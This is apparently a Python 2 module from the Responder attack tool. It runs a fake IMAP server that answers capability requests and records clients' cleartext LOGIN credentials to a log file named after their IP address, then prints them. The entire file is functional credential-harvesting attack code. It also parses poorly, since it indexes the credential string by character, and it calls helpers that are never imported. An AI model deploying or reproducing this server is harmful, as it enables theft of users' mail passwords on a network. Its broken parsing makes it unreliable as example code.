import os
import settings

from SocketServer import BaseRequestHandler
from packets import IMAPGreeting, IMAPCapability, IMAPCapabilityEnd

# IMAP4 Server class
class IMAP(BaseRequestHandler):

	def handle(self):
		try:
			self.request.send(str(IMAPGreeting()))
			data = self.request.recv(1024)

			if data[5:15] == "CAPABILITY":
				RequestTag = data[0:4]
				self.request.send(str(IMAPCapability()))
				self.request.send(str(IMAPCapabilityEnd(Tag=RequestTag)))
				data = self.request.recv(1024)

			if data[5:10] == "LOGIN":
				Credentials = data[10:].strip()
				Outfile = os.path.join(settings.Config.ResponderPATH, 'logs', "IMAP-Clear-Text-Password-%s.txt" % self.client_address[0])
				WriteData(Outfile, Credentials, Credentials)

				print text("[IMAP] Address  : %s" % color(self.client_address[0], 3, 0))
				print text("[IMAP] Username : %s" % color(Credentials[0], 3, 0))
				print text("[IMAP] Password : %s" % color(Credentials[1], 3, 0))

				## FIXME: Close connection properly
				## self.request.send(str(ditchthisconnection()))
				## data = self.request.recv(1024)

		except Exception:
			pass